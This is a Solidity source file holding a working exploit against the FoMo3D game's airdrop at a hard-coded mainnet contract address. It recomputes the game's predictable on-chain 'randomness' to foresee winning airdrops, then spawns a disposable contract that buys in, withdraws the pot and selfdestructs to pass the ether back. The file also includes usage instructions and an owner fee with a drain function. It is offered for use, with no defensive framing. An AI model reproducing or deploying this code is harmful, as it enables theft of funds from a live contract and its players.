1 pragma solidity ^0.4.24;
2 
3 /**
4  * How to use just send a tx of 0 eth to this contract address with 600k gas limit and message data 0x9e5faafc
5  * although it will probably not use that much it is just to be safe, as metamask will say the tx will fail
6  * because it doesnt know what the random number will be so you have to put the gas limit in yourself, also
7  * remember any unused gas is refunded so it wont cost much even if it fails. (failed tx will cost only a couple cents)
8  **/
9 
10 contract FoMo3Dlong{
11     uint256 public airDropPot_;
12     uint256 public airDropTracker_;
13     function withdraw() public;
14     function buyXaddr(address _affCode, uint256 _team) public payable;
15 }
16 
17 contract MainHub{
18     using SafeMath for *;
19     address public owner;
20     bool public closed = false;
21     FoMo3Dlong code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1);
22     
23     modifier onlyOwner{
24         require(msg.sender==owner);
25         _;
26     }
27     
28     modifier onlyNotClosed{
29         require(!closed);
30         _;
31     }
32     
33     constructor() public payable{
34         require(msg.value==.1 ether);
35         owner = msg.sender;
36     }
37     
38     function attack() public onlyNotClosed{
39         require(code.airDropPot_()>=.5 ether); //requires there is at least a pot of .5 ether otherwise not worth it.
40         require(airdrop());
41         uint256 initialBalance = address(this).balance;
42         (new AirdropHacker).value(.1 ether)();
43         uint256 postBalance = address(this).balance;
44         uint256 takenAmount = postBalance - initialBalance;
45         msg.sender.transfer(takenAmount*95/100); //5% fee, you didnt risk anything anyway.
46         require(address(this).balance>=.1 ether);//last sanity check (why the hell not?) if it reaches this you already won anyway
47     }
48     
49     function airdrop() private view returns(bool)
50     {
51         uint256 seed = uint256(keccak256(abi.encodePacked(
52             
53             (block.timestamp).add
54             (block.difficulty).add
55             ((uint256(keccak256(abi.encodePacked(block.coinbase)))) / (now)).add
56             (block.gaslimit).add
57             ((uint256(keccak256(abi.encodePacked(msg.sender)))) / (now)).add
58             (block.number)
59             
60         )));
61         if((seed - ((seed / 1000) * 1000)) < code.airDropTracker_())//looks at thier airdrop tracking number
62             return(true);
63         else
64             return(false);
65     }
66     
67     function drain() public onlyOwner{
68         closed = true;
69         owner.transfer(address(this).balance);//since funds are transfered immediately any money that is left in the contract is mine.
70     }
71     function() public payable{}
72 }
73 
74 contract AirdropHacker{
75     FoMo3Dlong code = FoMo3Dlong(0xA62142888ABa8370742bE823c1782D17A0389Da1);
76     constructor() public payable{
77         code.buyXaddr.value(.1 ether)(0xc6b453D5aa3e23Ce169FD931b1301a03a3b573C5,2);//just a random address
78         code.withdraw();
79         require(address(this).balance>=.1 ether);//would get 1/4 of airdrop, which appears to be on average .2 ether, this is just a sanity check
80         selfdestruct(msg.sender);
81     }
82     
83     function() public payable{}
84     
85 }
86 
87 library SafeMath {
88     /**
89     * @dev Subtracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
90     */
91     function sub(uint256 a, uint256 b)
92         internal
93         pure
94         returns (uint256) 
95     {
96         require(b <= a, "SafeMath sub failed");
97         return a - b;
98     }
99 
100     /**
101     * @dev Adds two numbers, throws on overflow.
102     */
103     function add(uint256 a, uint256 b)
104         internal
105         pure
106         returns (uint256 c) 
107     {
108         c = a + b;
109         require(c >= a, "SafeMath add failed");
110         return c;
111     }
112     
113 }